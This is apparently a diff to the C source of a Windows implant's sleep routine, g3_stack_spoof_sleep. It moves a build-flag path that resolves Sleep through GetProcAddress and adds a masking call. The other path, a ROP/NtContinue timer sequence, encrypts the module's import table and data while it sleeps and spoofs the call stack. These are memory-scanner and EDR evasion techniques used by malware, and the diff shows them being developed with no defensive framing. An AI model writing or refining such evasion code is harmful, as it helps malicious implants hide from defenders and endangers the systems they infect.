@@ -388,6 +388,19 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	unsigned char * rsp_at_wait;
 	BOOL ok = FALSE;
 
+#if defined(G3_ROP_OFF)
+	/* stage 1a: no timers at all - the ROP beats would stomp a plain
+	 * sleeping thread's stack (spoof at 300ms vs wake at `time`) */
+	{
+		void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
+			GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
+		if (psleep == NULL)
+			return FALSE;
+		maskfn(ctx);
+		psleep(time);
+		return TRUE;
+	}
+#else
 	pmemcpy = (void *(*)(void *, const void *, size_t))
 		GetProcAddress(GetModuleHandleA("ntdll.dll"), "memcpy");
 	pcontinue = (G3_NTCONTINUE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtContinue");
@@ -456,19 +469,7 @@ static BOOL g3_stack_spoof_sleep(DWORD time, G3_MASKFN maskfn, void * ctx)
 	/* from here until the wait returns: no API, no static data reads -
 	 * the IAT (.rdata) and .data are ciphertext for this whole span */
 	maskfn(ctx);
-#if defined(G3_ROP_OFF)
-	/* stage 1a acceptance: plain pointer-resolved sleep; ROP window needs
-	 * its own timing round (restore beat at time+600 died) */
-	{
-		void (WINAPI *psleep)(DWORD) = (void (WINAPI *)(DWORD))
-			GetProcAddress(GetModuleHandleA("kernel32.dll"), "Sleep");
-		if (psleep == NULL)
-			return FALSE;
-		psleep(time);
-	}
-#else
 	pwait(event, INFINITE);
-#endif
 	ok = TRUE;
 
 done:
@@ -477,6 +478,7 @@ done:
 	if (event != NULL)
 		CloseHandle(event);
 	return ok;
+#endif
 }
 
 /* ---------------- entry ---------------- */
